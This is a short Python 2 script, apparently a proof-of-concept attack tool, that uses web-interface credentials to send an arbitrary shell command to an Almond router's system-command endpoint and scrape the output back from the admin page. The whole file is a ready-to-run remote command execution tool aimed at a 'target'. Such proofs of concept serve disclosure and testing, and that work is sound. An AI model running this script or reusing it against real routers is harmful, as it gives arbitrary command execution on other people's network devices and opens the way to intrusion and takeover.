#!/usr/bin/python

import argparse
import httplib, urllib
from base64 import b64encode

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--host', required=True, type=str, help='IP Address of the Almond Router')
	parser.add_argument('-u', '--user', required=True, type=str, help='Almond Web interface user account')
	parser.add_argument('-p', '--password', required=True, type=str, help='Password for the specified user')
	parser.add_argument('-c', '--command', required =True, type=str, help='Command to run on Almond Router')
	args = parser.parse_args()

	host = args.host
	creds = args.user + ":" + args.password

	# auth is the authorization parameter for the request, simply
	# base64(user:password)
	auth = "Basic " + b64encode(creds).decode("ascii")
	cmd = args.command

	# set up the parameters for the request
	# command: The command you want to run on the almond router
	# SystemCommandSubmit, must be set to 'Apply'
	params = urllib.urlencode({'command': cmd, 'SystemCommandSubmit': "Apply"})

	# setup the HTTP headers for the request
	# Main headers of concern are Authorization and Referer
	headers = {
				'Content-type': "application/x-www-form-urlencoded",
				'Accept': "text/plain",
				'Authorization': auth,
				'Referer': "http://" + host + "/adm/system_command.asp"
	}

	print "[+] Sending '" + cmd + "' to target"

	# make the http post request
	conn = httplib.HTTPConnection(host+":80")
	conn.request("POST", "/goform/SystemCommand", params, headers)
	response = conn.getresponse()

	# the server SHOULD respond with HTTP 302 first
	if response.status != 302:
		print "\t[!] HTTP Response: " + str(response.status), response.reason
		exit()

	# get the command output
	conn.request("GET", "/adm/system_command.asp", params, headers)
	response = conn.getresponse()

	print "[+] " + str(response.status), response.reason

	# data returned is a webpage, parse it for the part we want
	data = response.read()
	data = data[data.find('readonly="1">',):data.find('</textarea></td>',)]
	data = data[len('readonly="1">'):]

	print "[+] Command Output: " 
	print data
	conn.close()

if __name__ == "__main__":
	main()
